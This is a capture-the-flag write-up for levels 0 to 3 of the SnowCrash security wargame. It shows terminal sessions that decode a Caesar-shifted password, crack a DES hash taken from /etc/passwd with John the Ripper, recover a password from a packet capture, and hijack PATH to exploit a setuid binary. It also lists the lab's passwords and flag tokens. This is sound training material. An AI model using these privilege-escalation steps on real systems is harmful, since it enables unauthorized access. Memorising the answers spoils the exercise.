# snow-crash

## level 0
level00@SnowCrash:~$ find / -user "flag00" 2> /dev/null 
/usr/sbin/john
/rofs/usr/sbin/john
level00@SnowCrash:~$ cat /usr/sbin/john 
cdiiddwpgswtgt


https://www.dcode.fr/chiffre-cesar
nottoohardhere


level00@SnowCrash:~$ su flag00
Password: nottoohardhere
Don't forget to launch getflag !
flag00@SnowCrash:~$ getflag
Check flag.Here is your token : x24ti5gi3x0ol2eh4esiuxias

## level 1

level01@SnowCrash:~$ cat /etc/passwd


flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash

vim hash.txt
                                                                                                                     
john hash.txt 
Created directory: /home/ju/.john
Using default input encoding: UTF-8
Loaded 1 password hash (descrypt, traditional crypt(3) [DES 256/256 AVX2])
Will run 12 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 642 candidates buffered for the current salt, minimum 3072 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst
abcdefg          (flag01)     
1g 0:00:00:00 DONE 2/3 (2025-01-15 17:11) 50.00g/s 3750Kp/s 3750Kc/s 3750KC/s 123456..2nesbitt
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 


level01@SnowCrash:~$ su flag01
Password: abcdefg
Don't forget to launch getflag !
flag01@SnowCrash:~$ getflag
Check flag.Here is your token : f2av5il02puano7naaf6adaaf
flag01@SnowCrash:~$

## level 2

└─$ scp -P 4242 level02@192.168.1.36:/home/user/level02/level02.pcap .                           


wireshark level02.pcap 

ft_wandr...NDRel.L0L(0d)(000d0a)(01)

7f

ft_wandr...NDRel.L0L(0d)(000d0a)(01)
ft_waNDReL0L(0d)(000d0a)(01) 
ft_waNDReL0L

level02@SnowCrash:~$ su flag02
Password: 
Don't forget to launch getflag !
flag02@SnowCrash:~$ getflag
Check flag.Here is your token : kooda2puivaav1idi4f57q8iq
flag02@SnowCrash:~$ 


## level 3

Une fois l executable decompilé avec ghidra

int main(int argc,char **argv,char **envp)

{
  __gid_t __rgid;
  __uid_t __ruid;
  int iVar1;
  gid_t gid;
  uid_t uid;
  
  __rgid = getegid();
  __ruid = geteuid();
  setresgid(__rgid,__rgid,__rgid);
  setresuid(__ruid,__ruid,__ruid);
  iVar1 = system("/usr/bin/env echo Exploit me");
  return iVar1;
}

("/usr/bin/env echo Exploit me");

on voit un appel systeme sur echo 
on change le path pour executer la commande getflag
whereis getflag
changement du path: echo '/bin/getflag' > '/tmp/echo'
unset PATH
export PATH=/tmp
./level03

flag='qi0maab88jeaj46qoumi7maus'

